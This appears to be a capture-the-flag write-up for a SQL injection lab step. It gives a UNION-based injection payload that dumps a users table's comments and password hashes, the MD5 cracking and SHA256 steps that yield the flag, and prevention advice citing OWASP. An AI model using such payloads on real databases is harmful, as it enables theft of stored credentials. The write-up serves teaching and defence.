# 08_members_sql_injection

## Instructions to reproduce

In the MEMBERS sections using this sql injection:
```
1 AND 1=2 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users;
```
We see a user with id 5 that is named 'Get The Flag' that has:
- **countersign**: 5ff9d0165b4f92b14994e5c685cdce28 
- **Commentaire**: Decrypt this password -> then lower all the char. Sh256 on it and it's good !

If we convert using MD5 we get **FortyTwo** and converting to Sha256 we get the flag.

## How to prevent

The preferred option is to use a safe API, which avoids using the interpreter entirely, provides a parameterized interface, or migrates to Object Relational Mapping Tools (ORMs).

[OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)